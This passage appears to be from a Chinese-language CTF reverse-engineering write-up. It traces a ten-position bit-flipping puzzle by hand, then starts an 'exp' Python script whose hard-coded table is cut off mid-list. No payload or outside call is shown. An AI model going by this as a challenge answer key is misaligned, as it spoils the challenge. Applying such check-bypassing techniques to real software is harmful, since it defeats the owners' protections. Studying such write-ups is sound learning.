<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原始值</span></span><br><span class="line"><span class="number">1011111111</span></span><br><span class="line"><span class="comment">//最终目标</span></span><br><span class="line"><span class="number">0000000000</span></span><br><span class="line"><span class="comment">//每个下标</span></span><br><span class="line"><span class="number">0123456789</span></span><br><span class="line"><span class="comment">//转变规则</span></span><br><span class="line"><span class="number">1100000000</span>---&gt;<span class="number">0100000000</span>  <span class="number">1</span>-&gt;<span class="number">0</span></span><br><span class="line"><span class="number">0100000000</span>---&gt;<span class="number">1100000000</span>  <span class="number">0</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="comment">//前2行的table值对应的堆下标</span></span><br><span class="line"><span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span></span><br><span class="line"><span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span></span><br><span class="line"><span class="comment">//手动代入测试</span></span><br><span class="line"><span class="number">1011111111</span>  <span class="comment">//下标为9是1，输入0</span></span><br><span class="line"><span class="number">0</span>          </span><br><span class="line"><span class="number">1011111110</span>  <span class="comment">//变为0，下标为7是1，输入0</span></span><br><span class="line"><span class="number">0</span>           </span><br><span class="line"><span class="number">1011111010</span>  <span class="comment">//110-&gt;010,成功，下标为9是0，输入1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011111011</span>  <span class="comment">//变为1，下标为8是1，输入0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011111001</span>  <span class="comment">//11-&gt;01,成功，下标为9是1，输入0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011111000</span>  <span class="comment">//到此完成了后面的3位变换，已经全部变为0了，找到套路了，再往下也一样的道理</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011101000</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011101001</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011101011</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011101010</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011101110</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011101111</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011101101</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011101100</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011100100</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011100101</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011100111</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011100110</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011100010</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1011100011</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011100001</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1011100000</span>  <span class="comment">//这里实现了5个0了，说明没有问题</span></span><br></pre></td></tr></table></figure>

<p>通过演示可以知道，由table表可以知道堆下标，然后只要那个值为1，我们就输入0，使它变为0，如果它是0，我们就输入1，使它变为1，经过856次操作就可以把所有的都变换成小于0的数，现在我们可以写个exp脚本了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span 